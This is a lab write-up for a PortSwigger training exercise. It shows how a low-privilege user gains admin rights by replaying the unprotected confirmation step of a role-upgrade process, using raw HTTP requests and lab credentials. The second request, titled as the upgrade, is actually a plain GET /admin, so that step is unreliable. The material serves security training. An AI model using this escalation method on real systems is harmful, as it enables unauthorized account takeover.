---
tags:
  - authz
---
# Multi-step process with no access control on one step

## Instructions

This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.

To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

## Solution

Logging in with the provided administrator credentials shows an option to upgrade a user. 

![](../../../../../site/_drafts/labs/PortSwigger/Authorization/attachments/authz-lab-12/file-20251124113610509.webp)Upgrading the user is a two step process:

1. Select upgrade user
2. Confirm the choice

The request for the second step is as follows:

```text title="Upgrade confirmation request"
POST /admin-roles HTTP/1.1
Host: 0aa7004e04259e7882c2e2c0002d004e.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: https://0aa7004e04259e7882c2e2c0002d004e.web-security-academy.net
Connection: keep-alive
Referer: https://0aa7004e04259e7882c2e2c0002d004e.web-security-academy.net/admin-roles
Cookie: session=Eb26fNhuK8JD3jBofVGQQzID77m5Z3rb
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: orange
Priority: u=0, i

action=upgrade&confirmed=true&username=wiener
```

Logging out of the administrator account and into the normal 'wiener' account should allow us to send a request directly to this endpoint.

```text title="Upgrade request as wiener"
GET /admin HTTP/1.1
Host: 0aa7004e04259e7882c2e2c0002d004e.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0aa7004e04259e7882c2e2c0002d004e.web-security-academy.net/login
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: orange
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Cookie: session=IYwt1ciNjesw8A5ooVXww8B8CzMJfaIu


```

![](../../../../../site/_drafts/labs/PortSwigger/Authorization/attachments/authz-lab-12/file-20251124113610510.webp)

